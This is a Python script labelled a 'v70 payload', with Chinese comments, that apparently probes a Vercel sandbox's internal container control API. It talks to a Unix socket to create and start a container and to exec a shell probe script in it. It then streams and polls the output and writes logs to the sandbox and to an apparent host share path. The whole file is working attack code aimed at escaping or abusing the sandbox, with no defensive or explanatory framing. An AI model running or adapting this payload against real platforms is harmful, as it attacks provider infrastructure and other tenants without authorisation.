# -*- coding: utf-8 -*-
"""v70 payload: cell API Create(drive)+Start+Exec 侦察脚本, 输出写回 COW"""
import socket, time, os

OUT = '/vercel/sandbox/v70c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v70c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    log('V70 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'

    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    log('create-drive -> %s | %s' % (st, bd[:200]))
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % cid)
    if not cid:
        log('V70C_DONE')
        return

    st, bd = rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
    log('start -> %s | %s' % (st, bd[:150]))
    time.sleep(1)

    st, bd = rpc(CTR + '/Exec',
                 '{"containerId":"%s","process":{"argv":["/bin/sh","/vercel/sandbox/exec_probe.sh"]}}' % cid, t=5)
    log('exec -> %s | %s' % (st, bd[:200]))
    if '"processId"' in bd:
        pid_ = bd.split('"processId":"')[1].split('"')[0]
        log('PROC=%s' % pid_)
        # 尝试 ProcessService/StreamOutput 拿输出
        st2, bd2 = rpc('/vercel.hive.cell.api.process.v1.ProcessService/StreamOutput',
                       '{"processId":"%s"}' % pid_, t=4)
        log('pstream -> %s | %s' % (st2, bd2[:200]))
        st3, bd3 = rpc(CTR + '/StreamOutput', '{"containerId":"%s"}' % cid, t=4)
        log('cstream -> %s | %s' % (st3, bd3[:200]))

    # 轮询 exec_probe.out (命令输出写回 COW)
    t_wait = 0
    while t_wait < 15:
        time.sleep(1)
        t_wait += 1
        try:
            if os.path.exists('/vercel/sandbox/exec_probe.out'):
                cur = open('/vercel/sandbox/exec_probe.out', errors='replace').read()
                if cur.strip():
                    log('--- exec_probe.out ---\n%s' % cur[:6000])
                    break
        except Exception:
            pass
    log('V70C_DONE')


main()
